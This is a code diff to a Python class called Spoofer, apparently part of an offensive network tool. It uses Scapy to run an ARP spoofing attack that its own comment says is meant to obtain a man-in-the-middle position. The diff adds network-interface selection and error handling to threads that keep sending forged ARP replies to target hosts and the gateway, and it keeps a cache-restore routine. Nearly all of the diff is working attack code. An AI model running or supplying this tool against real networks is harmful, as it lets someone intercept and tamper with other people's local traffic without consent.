@@ -20,31 +20,37 @@ class Spoofer:
 
 
     # get the MAC address of a given IP
-    @staticmethod
-    def _get_mac(ip):
-        ans, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip), timeout=3, verbose=0)
-        if ans:
-            return ans[0][1].src
-        return None
+    def _get_mac(self, ip):
+        try:
+            ans, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip), timeout=3, verbose=0, iface=self.__interface)
+            if ans:
+                return ans[0][1].src
+            return None
+        except OSError as e:
+            if 'No such device' in str(e):
+                logger.error(f'{self.__interface} is not a valid interface')
+            else:
+                logger.error(str(e))
+            exit(1)
 
 
     # start ARP spoofing attack so we can obtain MitM position
     def start(self):
         logger.info('Starting spoofer...')
-        self.__gateway_mac = Spoofer._get_mac(self.__gateway)
+        self.__gateway_mac = self._get_mac(self.__gateway)
         if self.__gateway_mac == None:
             logger.warning('Unable to get gateway\'s MAC, exiting...')
             exit(0)
 
         for target in self.__targets:
-            target_mac = Spoofer._get_mac(target)
+            target_mac = self._get_mac(target)
             if target_mac is None:
                 logger.warning(f'Unable to get MAC for target {target}')
             else:
                 logger.debug(f'Target {target} has MAC {target_mac}')
                 self.__target_dict[target] = target_mac
-                target_thread = Thread(target=Spoofer._spoof_target, args=(target, target_mac, self.__gateway, self.__gateway_mac, self.__mac, ), daemon=True)
-                gateway_thread = Thread(target=Spoofer._spoof_target, args=(self.__gateway, self.__gateway_mac, target, target_mac, self.__mac, ), daemon=True)
+                target_thread = Thread(target=Spoofer._spoof_target, args=(target, target_mac, self.__gateway, self.__gateway_mac, self.__mac, self.__interface, ), daemon=True)
+                gateway_thread = Thread(target=Spoofer._spoof_target, args=(self.__gateway, self.__gateway_mac, target, target_mac, self.__mac, self.__interface, ), daemon=True)
                 self.__threads.append(target_thread)
                 self.__threads.append(gateway_thread)
         
@@ -73,11 +79,11 @@ class Spoofer:
         for target_ip, target_mac in self.__target_dict.items():
             # restore target
             packet = ARP(pdst=target_ip, hwdst=target_mac, psrc=self.__gateway, hwsrc=self.__gateway_mac, op=2)
-            send(packet, verbose=0)
+            send(packet, verbose=0, iface=self.__interface)
 
             # restore gateway
             packet = ARP(pdst=self.__gateway, hwdst=self.__gateway_mac, psrc=target_ip, hwsrc=target_mac, op=2)
-            send(packet, verbose=0)
+            send(packet, verbose=0, iface=self.__interface)
 
             logger.debug(f'ARP cache for {target_ip} restored')
 
@@ -86,12 +92,12 @@ class Spoofer:
 
     # method to handle threaded ARP spoofing
     @staticmethod
-    def _spoof_target(target_ip, target_mac, host_ip, host_mac, attacker_mac):
+    def _spoof_target(target_ip, target_mac, host_ip, host_mac, attacker_mac, interface):
         current_thread = currentThread()
         while getattr(current_thread, "spoof", True):
             logger.debug(f'Spoofing {host_ip} is-at {attacker_mac} to {target_ip}')
             packet = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, op=2)
-            send(packet, verbose=0)
+            send(packet, verbose=0, iface=interface)
             time.sleep(5)
         logger.debug(f'Terminated thread spoofing {host_ip} to {target_ip}')
 
